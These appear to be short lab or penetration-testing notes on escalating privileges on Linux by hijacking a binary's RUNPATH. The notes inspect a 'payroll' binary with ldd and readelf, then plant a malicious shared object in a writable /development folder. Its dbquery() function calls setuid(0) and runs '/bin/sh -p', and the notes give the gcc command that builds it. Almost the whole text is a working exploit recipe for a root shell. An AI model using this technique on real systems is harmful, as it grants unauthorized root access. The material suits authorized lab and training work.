**See libraries
```shell-session
ldd payroll
```

**RUNPATH configuration allows libraries in this folder to be given preference over other folders
```shell-session
readelf -d payroll | grep PATH
```
- Allows loading of libraries from the /development folder
- Place a malicious library in /development

Next, find a function called by the binary
```shell-session
ldd payroll
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
```

**Create malicious shared object
```shell-session
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

**Compile
```shell-session
gcc src.c -fPIC -shared -o /development/libshared.so
./payroll
```
